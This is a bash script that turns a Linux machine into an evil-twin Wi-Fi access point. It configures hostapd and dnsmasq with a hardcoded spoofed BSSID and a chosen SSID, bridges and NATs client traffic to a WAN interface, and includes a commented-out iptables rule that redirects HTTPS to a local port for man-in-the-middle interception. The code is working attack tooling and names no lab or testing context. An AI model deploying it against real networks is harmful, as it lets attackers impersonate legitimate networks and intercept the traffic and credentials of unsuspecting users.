#!/bin/bash

# VARIABLES
EVIL_TWIN_MAC="00:11:22:33:44:55"  # Hardcoded MAC for tracking evil-twin APs
BR_IFACE="br0"

LAN_IP="192.168.200.1"
LAN_SUBNET="255.255.255.0"
LAN_DHCP_START="192.168.200.10"
LAN_DHCP_END="192.168.200.100"
LAN_DNS_SERVER="1.1.1.1"

DNSMASQ_CONF="tmp_dnsmasq.conf"
HOSTAPD_CONF="tmp_hostapd.conf"

if [ "$1" != "up" ] && [ "$1" != "down" ] || [ $# -ne 6 ]; then
    echo "missing required arguments"
    echo "$0: <up/down> <WIFI_IFACE> <WAN_IFACE> <SSID> <BAND> <WIFI_PASSWORD>"
    exit 1
fi

WIFI_IFACE=$2
WAN_IFACE=$3
SSID=$4
BAND=$5
LAN_IFACE="eth0"
WIFI_PASSWORD=$6

SCRIPT_RELATIVE_DIR=$(dirname "${BASH_SOURCE[0]}")
cd $SCRIPT_RELATIVE_DIR

echo "== stop router services"
sudo killall wpa_supplicant
sudo killall dnsmasq
echo "Stopping router services..."

echo "== reset all network interfaces"
sudo ifconfig $LAN_IFACE 0.0.0.0
sudo ifconfig $LAN_IFACE down
sudo ifconfig $BR_IFACE 0.0.0.0
sudo ifconfig $BR_IFACE down
sudo ifconfig $WIFI_IFACE 0.0.0.0
sudo ifconfig $WIFI_IFACE down
sudo brctl delbr $BR_IFACE

if [ $1 = "up" ]; then

    echo "== create dnsmasq config file"
    echo "interface=${BR_IFACE}" > $DNSMASQ_CONF
    echo "dhcp-range=${LAN_DHCP_START},${LAN_DHCP_END},${LAN_SUBNET},12h" >> $DNSMASQ_CONF
    echo "dhcp-option=6,${LAN_DNS_SERVER}" >> $DNSMASQ_CONF

echo "create hostapd config file"
echo "interface=${WIFI_IFACE}" > $HOSTAPD_CONF
echo "macaddr_acl=0" >> $HOSTAPD_CONF
echo "bssid=${EVIL_TWIN_MAC}" >> $HOSTAPD_CONF
echo "bridge=${BR_IFACE}" >> $HOSTAPD_CONF
echo "ssid=${SSID}" >> $HOSTAPD_CONF
echo "country_code=US" >> $HOSTAPD_CONF
if [ "$BAND" = "5GHz" ]; then
    echo "hw_mode=a" >> $HOSTAPD_CONF
    echo "channel=36" >> $HOSTAPD_CONF
    echo "ieee80211ac=1" >> $HOSTAPD_CONF
else
    echo "hw_mode=g" >> $HOSTAPD_CONF
    echo "channel=11" >> $HOSTAPD_CONF
fi
echo "ieee80211n=1" >> $HOSTAPD_CONF
# Only add WPA settings if password is provided and not NONE
if [ ! -z "$WIFI_PASSWORD" ] && [ "$WIFI_PASSWORD" != "NONE" ]; then
    echo "auth_algs=1" >> $HOSTAPD_CONF
    echo "wpa=2" >> $HOSTAPD_CONF
    echo "wpa_passphrase=${WIFI_PASSWORD}" >> $HOSTAPD_CONF
    echo "wpa_key_mgmt=WPA-PSK" >> $HOSTAPD_CONF
    echo "wpa_pairwise=CCMP" >> $HOSTAPD_CONF
else
    # For open network explicitly set auth_algs=1 (open system authentication)
    echo "auth_algs=1" >> $HOSTAPD_CONF
fi
#echo "ieee80211w=1" >> $HOSTAPD_CONF # PMF

echo "Using PSK: ${WIFI_PASSWORD}"
echo "Creating evil-twin with SSID: ${SSID}"
echo "WIFI Interface: ${WIFI_IFACE}"
echo "WAN Interface: ${WAN_IFACE}"

    echo "== bring up interfaces and bridge"
    sudo ifconfig $WIFI_IFACE up
    sudo ifconfig $WAN_IFACE up
    sudo ifconfig $LAN_IFACE up
    sudo brctl addbr $BR_IFACE
    sudo brctl addif $BR_IFACE $LAN_IFACE
    sudo ifconfig $BR_IFACE up

    echo "== setup iptables"
    sudo iptables --flush
    sudo iptables -t nat --flush
    sudo iptables -t nat -A POSTROUTING -o $WAN_IFACE -j MASQUERADE
    sudo iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
    sudo iptables -A FORWARD -i $BR_IFACE -o $WAN_IFACE -j ACCEPT
    # optional mitm rules
    #sudo iptables -t nat -A PREROUTING -i $BR_IFACE -p tcp -d 1.2.3.4 --dport 443 -j REDIRECT --to-ports 8081

    echo "== setting static IP on bridge interface"
    sudo ifconfig br0 inet $LAN_IP netmask $LAN_SUBNET

    echo "== starting dnsmasq"
    sudo dnsmasq -C $DNSMASQ_CONF

    echo "== starting hostapd"
    sudo hostapd $HOSTAPD_CONF
fi
